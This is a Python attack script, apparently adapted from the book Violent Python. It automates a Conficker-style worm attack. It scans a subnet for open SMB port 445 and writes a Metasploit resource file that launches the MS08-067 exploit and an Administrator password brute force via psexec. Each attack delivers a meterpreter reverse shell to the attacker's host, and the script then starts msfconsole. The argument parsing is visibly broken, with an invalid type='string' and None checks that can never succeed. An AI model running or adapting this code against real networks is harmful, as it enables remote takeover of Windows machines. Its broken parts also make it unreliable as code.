''' conficker.py from chapter 2 of Violent Python'''
import os
import argparse
import sys
import nmap


def findTgts(subNet):
    ''' find the targets'''
    nmScan = nmap.PortScanner()
    nmScan.scan(subNet, '445')
    tgtHosts = []
    for host in nmScan.all_hosts():
        if nmScan[host].has_tcp(445):
            state = nmScan[host]['tcp'][445]['state']
            if state == 'open':
                print('[+] Found Target Host: ' + host)
                tgtHosts.append(host)
    return tgtHosts


def setupHandler(configFile, lhost, lport):
    ''' setup the handler'''
    configFile.write('use exploit/multi/handler\n')
    configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('exploit -j -z\n')
    configFile.write('setg DisablePayloadHandler 1\n')


def confickerExploit(configFile, tgtHost, lhost, lport):
    ''' conficker exploit'''
    configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
    configFile.write('set RHOST ' + str(tgtHost) + '\n')
    configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('exploit -j -z\n')


def smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    ''' smb brute'''
    username = 'Administrator'
    with open(passwdFile, 'r', encoding='utf-8-sig') as pF:
        for password in pF.readlines():
            password = password.strip('\n').strip('\r')
            configFile.write('use exploit/windows/smb/psexec\n')
            configFile.write('set SMBUser ' + str(username) + '\n')
            configFile.write('set SMBPass ' + str(password) + '\n')
            configFile.write('set RHOST ' + str(tgtHost) + '\n')
            configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
            configFile.write('set LPORT ' + str(lport) + '\n')
            configFile.write('set LHOST ' + lhost + '\n')
            configFile.write('exploit -j -z\n')


def main():
    ''' main function'''
    with open('meta.rc', 'w', encoding='utf-8-sig') as configFile:
        parser = argparse.ArgumentParser(usage='conficker.py -H <RHOST[s]> -l <LHOST> [-p <LPORT> -F <Password File>]')
        parser.add_argument('-H', type='string', help='specify the target address[es]')
        parser.add_argument('-p', type='string', help='specify the listen port')
        parser.add_argument('-l', type='string', help='specify the listen address')
        parser.add_argument('-F', type='string', help='password file for SMB brute force attempt')
        args = parser.parse_args()
        args.tgtHost = str(args.H)
        args.lport = str(args.p)
        args.lhost = str(args.l)
        args.passwdFile = str(args.F)

        if (args.tgtHost is None) | (args.lhost is None):
            print(parser.usage)
            sys.exit(0)
        lhost = args.lhost
        lport = args.lport
        if lport is None:
            lport = '1337'
        passwdFile = args.passwdFile
        tgtHosts = findTgts(args.tgtHost)
        setupHandler(configFile, lhost, lport)
        for tgtHost in tgtHosts:
            confickerExploit(configFile, tgtHost, lhost, lport)
            if passwdFile is not None:
                smbBrute(configFile, tgtHost, passwdFile, lhost, lport)
    os.system('msfconsole -r meta.rc')


if __name__ == '__main__':
    main()
